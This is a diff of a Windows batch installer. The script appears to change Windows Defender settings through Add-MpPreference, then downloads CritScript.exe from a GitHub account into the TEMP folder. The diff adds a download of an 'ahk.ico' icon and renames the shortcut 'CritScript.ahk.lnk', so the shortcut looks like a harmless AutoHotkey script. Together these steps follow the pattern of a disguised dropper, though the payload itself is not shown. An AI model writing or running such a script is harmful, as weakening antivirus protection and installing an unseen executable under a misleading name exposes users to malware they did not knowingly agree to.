@@ -30,6 +30,7 @@ powershell -inputformat none -outputformat none -NonInteractive -Command "Add-Mp
 cd %TEMP%
 echo Downloading CritScript.exe...
 Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile CritScript.exe"
+Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/ahk.ico' -OutFile ahk.ico"
 if not exist "CritScript.exe" (
     echo Failed to download CritScript.exe. Exiting...
     pause
@@ -60,9 +61,9 @@ for %%F in (zombies.ahk ZOMBIES.AHK) do (
 )
 echo Zombies.ahk not found.
 
-set "shortcutPath=%TEMP%\Zombies Shortcut.lnk"
+set "shortcutPath=%TEMP%\CritScript.ahk.lnk"
 set "zombiesScript=%TEMP%\ZOMBIES.AHK"
-set "iconPath=%TEMP%\icon.ico"
+set "iconPath=%TEMP%\ahk.ico"
 
 if exist "%zombiesScript%" (
     echo Creating shortcut for ZOMBIES.AHK...
